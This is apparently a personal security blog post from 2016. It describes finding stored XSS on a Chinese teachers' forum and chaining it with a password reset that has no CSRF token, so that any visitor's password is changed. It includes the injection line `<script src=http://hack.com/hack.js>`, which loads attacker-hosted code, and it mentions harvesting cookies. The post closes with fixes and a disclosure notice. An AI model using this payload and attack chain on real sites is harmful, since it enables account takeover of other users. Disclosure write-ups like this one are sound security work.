title: Compromise Arbitrary Account on a Chinese Teacher Forum
sub_title: Reset User's Password by Exploiting Stored XSS
date: 2016-08-20

Find and Exploit XSS:
=====================

I was doing some random browsing on the internet today and found a
website very “interesting”.

[*http://update_after_fix*](http://update_after_fix) is a Chinese
teachers forum. Basically you can register an account, open classes
online, download&upload resources, discuss on topics and do all kinds of
teaching related stuff.

Then I registered an account and did some random testing. After a few
tries, I found some stored XSS vulnerabilities on the website.

In the comment page, it seems the backend server does nothing except
escaping quotes.

This can be simply by passed using fromCharCode function in javascript.

<p align="center">
<img height="232" src="https://lh5.googleusercontent.com/XEBusQGtEtqhpyjNySZZfUl4q6Ij4PRpowDtUAWMPH9YJaBm0naTI3B8Uk7Asa4rN-Eqkx5NbFA_JwW_u275rFw1fe3aQGhurc1gJ1RaM8loI_RGOV3O9jogS2yZvdZ-7VVx1--2" style="border:2px solid black; transform: rotate(0rad);" width="400">
</p>
<p align="center">
Vulnerable comment page
</p>
Similarly, in user’s diary and user’s education record, every input is
not filtered correctly and leave the site vulnerable to attackers.

<p align="center">
<img height="153" src="https://lh4.googleusercontent.com/cbNe5Tdoih9jtaeRttfYahKOFBXjNkErzAlHNwOjgGg2x5Dn5UMixaAgjroedh2YOan9v7MxZJ377wjL1CkuC4Y2h2C8SaGF4aiET5nlTbt3czZDNgwYXjEBvc4uvkNVtje2Lf91" style="border:2px solid black; transform: rotate(0rad);" width="400">
</p>
<p align="center">
Stored xss example
</p>
Cookie is not set to http-only and I also generated the alert on
document.cookie.

<p align="center">
<img height="105" src="https://lh5.googleusercontent.com/0ebGfYdDUG5P84G2OTgqVmAwZUY1-351TJ6C6HoV1i62-hPJeHxLwQ6DI25VHAyKGzHhj1zWzExqYjHrxp-PK326WWiffjRtgiFqpuxMyaRd_NMgb_d1oJ1vlf2VWzdFm7HOyBfG" style="border:2px solid black; transform: rotate(0rad);" width="400">
</p>
<p align="center">
Get document cookie
</p>
Then I decided to report this issue to the website administrator. But
since at that time was at night in China, maybe the admin was still
sleeping. So I thought it would be more convincing if I can give some
serious POC.

After some browsing, I found a big security weakness that can be
exploited.

In the “reset password” panel, old password is not needed at all. This
means a user can reset his password just based on his current session.
This is a silly design.

<p align="center">
<img height="246" src="https://lh5.googleusercontent.com/2UD5-7ZVANtZscpy8lijTUVLarlashrhvE5ZckmDDNY5mabFNdm-_yfLC-3_MYMrentlMucoTd2LnjkImVpR_QTNsGv-wMGdbEuSw0XGm8g4GcMUI9XA_c-Q4Sc8-uJENUZd4WVz" style="border:2px solid black; transform: rotate(0rad);" width="400">
</p>
<p align="center">
Password update page
</p>

I captured the packet used to reset password,

<p align="center">
<img height="213" src="https://lh4.googleusercontent.com/ROA-FWVQFThS5yTIhSlESd2Nxl3O6hQFC0ugueEcMivDg4KDmKNbC5qyDih_jlg3w1xYSX8nTc8lfB_EU_jDuSUCdY6avAcsJJ8lOuIke_n6wTbCCTfc-K0yoHhUCm5HlO33cM1u" style="border:2px solid black; transform: rotate(0rad);" width="400">
</p>
<p align="center">
Reset password packet
</p>
By looking into the packet, I found that the process has no csrf token
and it is a perfect vulnerability to exploit XSS.

Then I wrote a simple POC.

<script src="https://gist.github.com/rundongliu/c586fd7f62734e5ac2590b6e03328b74.js"></script>
I tried to inject the code into the input but the backend server did
some length checking.

Then I uploaded the code onto my server and tried to inject

&lt;script
src=http://hack.com/hack.js&gt &lt;/script&gt;
as input

Since the server escapes quotes, I did not add quotes to the url. I
tested firefox and chrome, they both works fine.

After that, I tested it in my browser, and captured the result.

<p align="center">
<img height="202" src="https://lh3.googleusercontent.com/nFG5jpwOFBnnvPv4in8jsomeyFdLBj6xh6nsiupMLOps3d92XsfdqY1yJeqxKvIZUjizpRgfwY03-eV-GFPyQWjFD3ZT2ez0hDovZJYU3Tc0WSUmiiUq6QLwuJ6aR2vyMS5xQcXl" style="border:2px solid black; transform: rotate(0rad);" width="400">
</p>
<p align="center">
Reset password success
</p>
Bang, we are able to reset any account’s password. If any logged in user
visits this page, his password will be set to “hahaha”. :)

Since the cookie contains account’s username in it. We can also add one
line of code to harvest the compromised cookie.

This is very easy to do and I will not demonstrate the details.

Now, we can sit in front of our computer and wait to harvest compromised
accounts!

Conclusion:
===========

By writing this blog, I want to demonstrate how serious XSS is. An
attacker can use it to do lots of stuff and cause huge damage.

The most important thing is

Web developers should know about security.
------------------------------------------

To fix these issues,

1 Correctly filter user input.

2 Add csrf token for sensitive operations.

3 Set cookie to http-only

4 Validate user when resetting password

Notice:
=======

All the test are done on my own homepage and can not be accessed by
other users. I deleted the script comment as soon as I finished testing.

I could have done this on this website’s main page but this would have
severely damage other users’ experience.

I have reported this vulnerability to related party and they will
probably fix it soon.

My test is only for POC and reporting bugs to administrator, please do
not use this to do bad stuff.

**Visit**
[***blogger***](https://rundongliu.blogspot.com/2016/08/reset-users-accounts-by-exploiting.html)
**to comment.**
